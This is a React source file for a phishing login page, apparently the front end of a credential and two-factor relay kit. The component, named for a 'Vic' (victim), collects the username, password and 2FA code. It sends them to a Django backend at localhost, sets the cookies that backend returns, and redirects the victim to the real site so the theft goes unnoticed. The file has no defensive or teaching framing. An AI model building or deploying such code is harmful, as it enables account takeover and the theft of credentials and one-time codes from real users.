import React, { useState } from 'react';

const VicLoginPage = () => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [twofaCode, setTwofaCode] = useState('');
    const [isTwofaRequired, setIsTwofaRequired] = useState(false);
    const [error, setError] = useState('');
    const [loading, setLoading] = useState(false);

    // Step 1: Handle the successful login (including the cookies)
    const handleSuccessfulLogin = (data) => {
        // Extract the redirect URL and cookies from the backend response
        const redirectUrl = data.redirect_url;
        const cookies = data.cookies;

        // Set the cookies in the browser (document.cookie)
        for (const [cookieName, cookieValue] of Object.entries(cookies)) {
            document.cookie = `${cookieName}=${cookieValue}; path=/; secure; HttpOnly`;
        }

        // Redirect to the real website
        window.location.href = redirectUrl;  // Victim is redirected to the real website
    };

    // Step 2: Handle login form submission
    const handleLoginSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        setError('');

        // Send username and password to the Django backend
        const response = await fetch('http://localhost:8000/submit-login/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ username, password }),
        });

        const data = await response.json();

        setLoading(false);

        if (data.requires_2fa) {
            // If 2FA is required, display 2FA form
            setIsTwofaRequired(true);
        } else if (data.redirect_url && data.cookies) {
            // If login is successful and cookies are returned, handle the redirect and cookies
            handleSuccessfulLogin(data);
        } else {
            // Handle errors (e.g., invalid login)
            setError(data.error || 'An error occurred.');
        }
    };

    // Step 3: Handle 2FA form submission
    const handle2faSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        setError('');

        // Send 2FA code to the Django backend for validation
        const response = await fetch('http://localhost:8000/submit-2fa/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ username, password, twofaCode }),
        });

        const data = await response.json();

        setLoading(false);

        if (data.redirect_url && data.cookies) {
            // If 2FA is successful and cookies are returned, handle the redirect and cookies
            handleSuccessfulLogin(data);
        } else {
            setError(data.error || 'Invalid 2FA code.');
        }
    };

    return (
        <div className="flex justify-center items-center h-screen bg-gray-100">
            <div className="bg-white p-8 rounded-lg shadow-lg w-96">
                <h2 className="text-xl font-bold mb-4 text-center">Login</h2>

                {loading && <div className="text-center text-blue-500 mb-4">Processing...</div>}

                {!isTwofaRequired ? (
                    <form onSubmit={handleLoginSubmit}>
                        <input
                            type="text"
                            placeholder="Username"
                            className="w-full p-2 mb-4 border rounded"
                            value={username}
                            onChange={(e) => setUsername(e.target.value)}
                            required
                        />
                        <input
                            type="password"
                            placeholder="Password"
                            className="w-full p-2 mb-4 border rounded"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            required
                        />
                        <button type="submit" className="w-full py-2 bg-blue-500 text-white rounded">
                            Login
                        </button>
                    </form>
                ) : (
                    <form onSubmit={handle2faSubmit}>
                        <input
                            type="text"
                            placeholder="Enter 2FA code"
                            className="w-full p-2 mb-4 border rounded"
                            value={twofaCode}
                            onChange={(e) => setTwofaCode(e.target.value)}
                            required
                        />
                        <button type="submit" className="w-full py-2 bg-blue-500 text-white rounded">
                            Submit 2FA Code
                        </button>
                    </form>
                )}

                {error && <p className="text-red-500 mt-4 text-center">{error}</p>}
            </div>
        </div>
    );
};

export default VicLoginPage;
